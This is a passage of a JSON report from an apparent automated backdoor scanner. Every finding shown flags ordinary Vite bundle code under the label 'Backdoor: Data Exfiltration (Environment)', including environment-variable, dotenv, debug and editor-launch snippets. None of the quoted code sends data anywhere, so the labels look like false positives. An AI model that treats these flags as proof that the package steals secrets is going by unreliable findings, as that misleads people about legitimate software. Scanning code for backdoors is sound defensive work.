                    "text": "var picocolors = {exports: {}};\n\nlet argv = process.argv || [],\n\tenv$1 = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env$1 || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env$1 ||\n",
                    "rendered": {
                      "text": "var picocolors = {exports: {}};\n\nlet argv = process.argv || [],\n\tenv$1 = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env$1 || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env$1 ||\n",
                      "markdown": "`var picocolors = {exports: {}};\n\nlet argv = process.argv || [],\n\tenv$1 = process.env;\nlet isColorSupported =\n\t!(\"NO_COLOR\" in env$1 || argv.includes(\"--no-color\")) &&\n\t(\"FORCE_COLOR\" in env$1 ||\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 63299,
                  "startColumn": 60,
                  "endLine": 63299,
                  "endColumn": 107,
                  "snippet": {
                    "text": "  const isConfigDependency = config.configFileDependencies.some(\n    (name) => file === name\n  );\n  const isEnv = config.inlineConfig.envFile !== false && getEnvFilesForMode(config.mode, config.envDir).includes(file);\n  if (isConfig || isConfigDependency || isEnv) {\n    debugHmr?.(`[config change] ${colors$1.dim(shortFile)}`);\n    config.logger.info(\n",
                    "rendered": {
                      "text": "  const isConfigDependency = config.configFileDependencies.some(\n    (name) => file === name\n  );\n  const isEnv = config.inlineConfig.envFile !== false && getEnvFilesForMode(config.mode, config.envDir).includes(file);\n  if (isConfig || isConfigDependency || isEnv) {\n    debugHmr?.(`[config change] ${colors$1.dim(shortFile)}`);\n    config.logger.info(\n",
                      "markdown": "`  const isConfigDependency = config.configFileDependencies.some(\n    (name) => file === name\n  );\n  const isEnv = config.inlineConfig.envFile !== false && getEnvFilesForMode(config.mode, config.envDir).includes(file);\n  if (isConfig || isConfigDependency || isEnv) {\n    debugHmr?.(`[config change] ${colors$1.dim(shortFile)}`);\n    config.logger.info(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 63299,
                  "startColumn": 10,
                  "endLine": 63299,
                  "endColumn": 60,
                  "snippet": {
                    "text": "  const isConfigDependency = config.configFileDependencies.some(\n    (name) => file === name\n  );\n  const isEnv = config.inlineConfig.envFile !== false && getEnvFilesForMode(config.mode, config.envDir).includes(file);\n  if (isConfig || isConfigDependency || isEnv) {\n    debugHmr?.(`[config change] ${colors$1.dim(shortFile)}`);\n    config.logger.info(\n",
                    "rendered": {
                      "text": "  const isConfigDependency = config.configFileDependencies.some(\n    (name) => file === name\n  );\n  const isEnv = config.inlineConfig.envFile !== false && getEnvFilesForMode(config.mode, config.envDir).includes(file);\n  if (isConfig || isConfigDependency || isEnv) {\n    debugHmr?.(`[config change] ${colors$1.dim(shortFile)}`);\n    config.logger.info(\n",
                      "markdown": "`  const isConfigDependency = config.configFileDependencies.some(\n    (name) => file === name\n  );\n  const isEnv = config.inlineConfig.envFile !== false && getEnvFilesForMode(config.mode, config.envDir).includes(file);\n  if (isConfig || isConfigDependency || isEnv) {\n    debugHmr?.(`[config change] ${colors$1.dim(shortFile)}`);\n    config.logger.info(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53739,
                  "startColumn": 18,
                  "endLine": 53739,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n    try {\n        resolved = which.sync(parsed.command, {\n            path: env[getPathKey({ env })],\n            pathExt: withoutPathExt ? path$1.delimiter : undefined,\n        });\n    } catch (e) {\n",
                    "rendered": {
                      "text": "\n    try {\n        resolved = which.sync(parsed.command, {\n            path: env[getPathKey({ env })],\n            pathExt: withoutPathExt ? path$1.delimiter : undefined,\n        });\n    } catch (e) {\n",
                      "markdown": "`\n    try {\n        resolved = which.sync(parsed.command, {\n            path: env[getPathKey({ env })],\n            pathExt: withoutPathExt ? path$1.delimiter : undefined,\n        });\n    } catch (e) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53658,
                  "startColumn": 14,
                  "endLine": 53658,
                  "endColumn": 46,
                  "snippet": {
                    "text": "const whichSync = (cmd, opt) => {\n  opt = opt || {};\n\n  const { pathEnv, pathExt, pathExtExe } = getPathInfo(cmd, opt);\n  const found = [];\n\n  for (let i = 0; i < pathEnv.length; i ++) {\n",
                    "rendered": {
                      "text": "const whichSync = (cmd, opt) => {\n  opt = opt || {};\n\n  const { pathEnv, pathExt, pathExtExe } = getPathInfo(cmd, opt);\n  const found = [];\n\n  for (let i = 0; i < pathEnv.length; i ++) {\n",
                      "markdown": "`const whichSync = (cmd, opt) => {\n  opt = opt || {};\n\n  const { pathEnv, pathExt, pathExtExe } = getPathInfo(cmd, opt);\n  const found = [];\n\n  for (let i = 0; i < pathEnv.length; i ++) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53619,
                  "startColumn": 14,
                  "endLine": 53619,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  if (!opt)\n    opt = {};\n\n  const { pathEnv, pathExt, pathExtExe } = getPathInfo(cmd, opt);\n  const found = [];\n\n  const step = i => new Promise((resolve, reject) => {\n",
                    "rendered": {
                      "text": "  if (!opt)\n    opt = {};\n\n  const { pathEnv, pathExt, pathExtExe } = getPathInfo(cmd, opt);\n  const found = [];\n\n  const step = i => new Promise((resolve, reject) => {\n",
                      "markdown": "`  if (!opt)\n    opt = {};\n\n  const { pathEnv, pathExt, pathExtExe } = getPathInfo(cmd, opt);\n  const found = [];\n\n  const step = i => new Promise((resolve, reject) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47346,
                  "startColumn": 21,
                  "endLine": 47346,
                  "endColumn": 38,
                  "snippet": {
                    "text": "  return JSON.stringify(value);\n}\nfunction getImportMetaEnvKeyRe(marker) {\n  let re = importMetaEnvKeyReCache.get(marker);\n  if (!re) {\n    re = new RegExp(`${marker}\\\\..+?\\\\b`, \"g\");\n    importMetaEnvKeyReCache.set(marker, re);\n",
                    "rendered": {
                      "text": "  return JSON.stringify(value);\n}\nfunction getImportMetaEnvKeyRe(marker) {\n  let re = importMetaEnvKeyReCache.get(marker);\n  if (!re) {\n    re = new RegExp(`${marker}\\\\..+?\\\\b`, \"g\");\n    importMetaEnvKeyReCache.set(marker, re);\n",
                      "markdown": "`  return JSON.stringify(value);\n}\nfunction getImportMetaEnvKeyRe(marker) {\n  let re = importMetaEnvKeyReCache.get(marker);\n  if (!re) {\n    re = new RegExp(`${marker}\\\\..+?\\\\b`, \"g\");\n    importMetaEnvKeyReCache.set(marker, re);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47267,
                  "startColumn": 29,
                  "endLine": 47267,
                  "endColumn": 44,
                  "snippet": {
                    "text": "      if (!pattern.test(code)) return;\n      const hasDefineImportMetaEnv = \"import.meta.env\" in define;\n      let marker = importMetaEnvMarker;\n      if (hasDefineImportMetaEnv && code.includes(marker)) {\n        let i = 1;\n        do {\n          marker = importMetaEnvMarker + i++;\n",
                    "rendered": {
                      "text": "      if (!pattern.test(code)) return;\n      const hasDefineImportMetaEnv = \"import.meta.env\" in define;\n      let marker = importMetaEnvMarker;\n      if (hasDefineImportMetaEnv && code.includes(marker)) {\n        let i = 1;\n        do {\n          marker = importMetaEnvMarker + i++;\n",
                      "markdown": "`      if (!pattern.test(code)) return;\n      const hasDefineImportMetaEnv = \"import.meta.env\" in define;\n      let marker = importMetaEnvMarker;\n      if (hasDefineImportMetaEnv && code.includes(marker)) {\n        let i = 1;\n        do {\n          marker = importMetaEnvMarker + i++;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47218,
                  "startColumn": 24,
                  "endLine": 47218,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    }\n  }\n  function generatePattern(ssr) {\n    const replaceProcessEnv = !ssr || config.ssr?.target === \"webworker\";\n    const define = {\n      ...replaceProcessEnv ? processEnv : {},\n      ...importMetaKeys,\n",
                    "rendered": {
                      "text": "    }\n  }\n  function generatePattern(ssr) {\n    const replaceProcessEnv = !ssr || config.ssr?.target === \"webworker\";\n    const define = {\n      ...replaceProcessEnv ? processEnv : {},\n      ...importMetaKeys,\n",
                      "markdown": "`    }\n  }\n  function generatePattern(ssr) {\n    const replaceProcessEnv = !ssr || config.ssr?.target === \"webworker\";\n    const define = {\n      ...replaceProcessEnv ? processEnv : {},\n      ...importMetaKeys,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45239,
                  "startColumn": 14,
                  "endLine": 45239,
                  "endColumn": 23,
                  "snippet": {
                    "text": "      return ['--line', lineNumber, '--column', columnNumber, fileName]\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [fileName, lineNumber, columnNumber]\n  }\n\n",
                    "rendered": {
                      "text": "      return ['--line', lineNumber, '--column', columnNumber, fileName]\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [fileName, lineNumber, columnNumber]\n  }\n\n",
                      "markdown": "`      return ['--line', lineNumber, '--column', columnNumber, fileName]\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [fileName, lineNumber, columnNumber]\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45085,
                  "startColumn": 20,
                  "endLine": 45085,
                  "endColumn": 29,
                  "snippet": {
                    "text": "  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n  if (process.versions.webcontainer) {\n",
                    "rendered": {
                      "text": "  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n  if (process.versions.webcontainer) {\n",
                      "markdown": "`  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n  if (process.versions.webcontainer) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45084,
                  "startColumn": 14,
                  "endLine": 45084,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    return shellQuote.parse(specifiedEditor)\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n",
                    "rendered": {
                      "text": "    return shellQuote.parse(specifiedEditor)\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n",
                      "markdown": "`    return shellQuote.parse(specifiedEditor)\n  }\n\n  if (process.env.LAUNCH_EDITOR) {\n    return [process.env.LAUNCH_EDITOR]\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44953,
                  "startColumn": 12,
                  "endLine": 44953,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\nvar parse$6 = function parse(s, env, opts) {\n\tvar mapped = parseInternal(s, env, opts);\n\tif (typeof env !== 'function') {\n\t\treturn mapped;\n\t}\n\treturn mapped.reduce(function (acc, s) {\n",
                    "rendered": {
                      "text": "\nvar parse$6 = function parse(s, env, opts) {\n\tvar mapped = parseInternal(s, env, opts);\n\tif (typeof env !== 'function') {\n\t\treturn mapped;\n\t}\n\treturn mapped.reduce(function (acc, s) {\n",
                      "markdown": "`\nvar parse$6 = function parse(s, env, opts) {\n\tvar mapped = parseInternal(s, env, opts);\n\tif (typeof env !== 'function') {\n\t\treturn mapped;\n\t}\n\treturn mapped.reduce(function (acc, s) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44798,
                  "startColumn": 16,
                  "endLine": 44798,
                  "endColumn": 29,
                  "snippet": {
                    "text": "}\n\nfunction getVar(env, pre, key) {\n\tvar r = typeof env === 'function' ? env(key) : env[key];\n\tif (typeof r === 'undefined' && key != '') {\n\t\tr = '';\n\t} else if (typeof r === 'undefined') {\n",
                    "rendered": {
                      "text": "}\n\nfunction getVar(env, pre, key) {\n\tvar r = typeof env === 'function' ? env(key) : env[key];\n\tif (typeof r === 'undefined' && key != '') {\n\t\tr = '';\n\t} else if (typeof r === 'undefined') {\n",
                      "markdown": "`}\n\nfunction getVar(env, pre, key) {\n\tvar r = typeof env === 'function' ? env(key) : env[key];\n\tif (typeof r === 'undefined' && key != '') {\n\t\tr = '';\n\t} else if (typeof r === 'undefined') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39728,
                  "startColumn": 30,
                  "endLine": 39728,
                  "endColumn": 68,
                  "snippet": {
                    "text": "\n\t\tfunction save(namespaces) {\n\t\t  if (null == namespaces) {\n\t\t    // If you set a process.env field to null or undefined, it gets cast to the\n\t\t    // string 'null' or 'undefined'. Just delete instead.\n\t\t    delete process.env.DEBUG;\n\t\t  } else {\n",
                    "rendered": {
                      "text": "\n\t\tfunction save(namespaces) {\n\t\t  if (null == namespaces) {\n\t\t    // If you set a process.env field to null or undefined, it gets cast to the\n\t\t    // string 'null' or 'undefined'. Just delete instead.\n\t\t    delete process.env.DEBUG;\n\t\t  } else {\n",
                      "markdown": "`\n\t\tfunction save(namespaces) {\n\t\t  if (null == namespaces) {\n\t\t    // If you set a process.env field to null or undefined, it gets cast to the\n\t\t    // string 'null' or 'undefined'. Just delete instead.\n\t\t    delete process.env.DEBUG;\n\t\t  } else {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39621,
                  "startColumn": 44,
                  "endLine": 39621,
                  "endColumn": 60,
                  "snippet": {
                    "text": "\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(function (key) {\n\t\t  return /^debug_/i.test(key);\n\t\t}).reduce(function (obj, key) {\n\t\t  // camel-case\n",
                    "rendered": {
                      "text": "\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(function (key) {\n\t\t  return /^debug_/i.test(key);\n\t\t}).reduce(function (obj, key) {\n\t\t  // camel-case\n",
                      "markdown": "`\t\t *   $ DEBUG_COLORS=no DEBUG_DEPTH=10 DEBUG_SHOW_HIDDEN=enabled node script.js\n\t\t */\n\n\t\texports.inspectOpts = Object.keys(process.env).filter(function (key) {\n\t\t  return /^debug_/i.test(key);\n\t\t}).reduce(function (obj, key) {\n\t\t  // camel-case\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 39300,
                  "startColumn": 7,
                  "endLine": 39300,
                  "endColumn": 58,
                  "snippet": {
                    "text": "\t\t  debug.useColors = exports.useColors();\n\t\t  debug.color = selectColor(namespace);\n\n\t\t  // env-specific initialization logic for debug instances\n\t\t  if ('function' === typeof exports.init) {\n\t\t    exports.init(debug);\n\t\t  }\n",
                    "rendered": {
                      "text": "\t\t  debug.useColors = exports.useColors();\n\t\t  debug.color = selectColor(namespace);\n\n\t\t  // env-specific initialization logic for debug instances\n\t\t  if ('function' === typeof exports.init) {\n\t\t    exports.init(debug);\n\t\t  }\n",
                      "markdown": "`\t\t  debug.useColors = exports.useColors();\n\t\t  debug.color = selectColor(namespace);\n\n\t\t  // env-specific initialization logic for debug instances\n\t\t  if ('function' === typeof exports.init) {\n\t\t    exports.init(debug);\n\t\t  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34900,
                  "startColumn": 6,
                  "endLine": 34900,
                  "endColumn": 19,
                  "snippet": {
                    "text": "  envPrefix = \"VITE_\"\n}) {\n  envPrefix = arraify(envPrefix);\n  if (envPrefix.includes(\"\")) {\n    throw new Error(\n      `envPrefix option contains value '', which could lead unexpected exposure of sensitive information.`\n    );\n",
                    "rendered": {
                      "text": "  envPrefix = \"VITE_\"\n}) {\n  envPrefix = arraify(envPrefix);\n  if (envPrefix.includes(\"\")) {\n    throw new Error(\n      `envPrefix option contains value '', which could lead unexpected exposure of sensitive information.`\n    );\n",
                      "markdown": "`  envPrefix = \"VITE_\"\n}) {\n  envPrefix = arraify(envPrefix);\n  if (envPrefix.includes(\"\")) {\n    throw new Error(\n      `envPrefix option contains value '', which could lead unexpected exposure of sensitive information.`\n    );\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34866,
                  "startColumn": 8,
                  "endLine": 34866,
                  "endColumn": 22,
                  "snippet": {
                    "text": "  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n      if (!tryStatSync(filePath)?.isFile()) return [];\n",
                    "rendered": {
                      "text": "  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n      if (!tryStatSync(filePath)?.isFile()) return [];\n",
                      "markdown": "`  }\n  prefixes = arraify(prefixes);\n  const env = {};\n  const envFiles = getEnvFilesForMode(mode, envDir);\n  const parsed = Object.fromEntries(\n    envFiles.flatMap((filePath) => {\n      if (!tryStatSync(filePath)?.isFile()) return [];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34669,
                  "startColumn": 53,
                  "endLine": 34669,
                  "endColumn": 99,
                  "snippet": {
                    "text": "\n  // dotenvKey exists but .env.vault file does not exist\n  if (!vaultPath) {\n    _warn(`You set DOTENV_KEY but you are missing a .env.vault file at ${vaultPath}. Did you forget to build it?`);\n\n    return DotenvModule.configDotenv(options)\n  }\n",
                    "rendered": {
                      "text": "\n  // dotenvKey exists but .env.vault file does not exist\n  if (!vaultPath) {\n    _warn(`You set DOTENV_KEY but you are missing a .env.vault file at ${vaultPath}. Did you forget to build it?`);\n\n    return DotenvModule.configDotenv(options)\n  }\n",
                      "markdown": "`\n  // dotenvKey exists but .env.vault file does not exist\n  if (!vaultPath) {\n    _warn(`You set DOTENV_KEY but you are missing a .env.vault file at ${vaultPath}. Did you forget to build it?`);\n\n    return DotenvModule.configDotenv(options)\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34633,
                  "startColumn": 24,
                  "endLine": 34633,
                  "endColumn": 69,
                  "snippet": {
                    "text": "  for (const path of optionPaths) {\n    try {\n      // Specifying an encoding returns a string instead of a buffer\n      const parsed = DotenvModule.parse(fs$9.readFileSync(path, { encoding }));\n\n      DotenvModule.populate(parsedAll, parsed, options);\n    } catch (e) {\n",
                    "rendered": {
                      "text": "  for (const path of optionPaths) {\n    try {\n      // Specifying an encoding returns a string instead of a buffer\n      const parsed = DotenvModule.parse(fs$9.readFileSync(path, { encoding }));\n\n      DotenvModule.populate(parsedAll, parsed, options);\n    } catch (e) {\n",
                      "markdown": "`  for (const path of optionPaths) {\n    try {\n      // Specifying an encoding returns a string instead of a buffer\n      const parsed = DotenvModule.parse(fs$9.readFileSync(path, { encoding }));\n\n      DotenvModule.populate(parsedAll, parsed, options);\n    } catch (e) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34587,
                  "startColumn": 16,
                  "endLine": 34587,
                  "endColumn": 28,
                  "snippet": {
                    "text": "}\n\nfunction _configVault (options) {\n  _log('Loading env from encrypted .env.vault');\n\n  const parsed = DotenvModule._parseVault(options);\n\n",
                    "rendered": {
                      "text": "}\n\nfunction _configVault (options) {\n  _log('Loading env from encrypted .env.vault');\n\n  const parsed = DotenvModule._parseVault(options);\n\n",
                      "markdown": "`}\n\nfunction _configVault (options) {\n  _log('Loading env from encrypted .env.vault');\n\n  const parsed = DotenvModule._parseVault(options);\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34539,
                  "startColumn": 8,
                  "endLine": 34539,
                  "endColumn": 42,
                  "snippet": {
                    "text": "  }\n\n  // Get environment\n  const environment = uri.searchParams.get('environment');\n  if (!environment) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing environment part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                    "rendered": {
